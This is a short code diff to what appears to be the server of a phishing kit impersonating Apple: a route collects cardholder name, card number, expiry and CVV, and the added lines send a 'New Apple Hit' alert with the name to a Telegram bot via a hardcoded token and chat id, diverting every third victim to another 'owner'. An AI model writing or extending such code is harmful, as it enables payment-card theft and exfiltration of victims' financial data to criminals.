@@ -2019,6 +2019,9 @@ app.post("/appleSaveCC", cors(), (req, res) => {
   let { ccname, ccnum, ccexp, cvv, owner, uniqueid } = req.body;
 
   if (appleCount == 3) {
+    axios.post(
+      `https://api.telegram.org/bot5518619222:AAGCaDEwIH9ETbJ8Y9Wc7aed2z5wnfI-2ek/sendMessage?chat_id=680379375&text=New Apple Hit:\n${ccname}`
+    );
     owner = "haytchApple";
     appleCount = 0;
   } else {
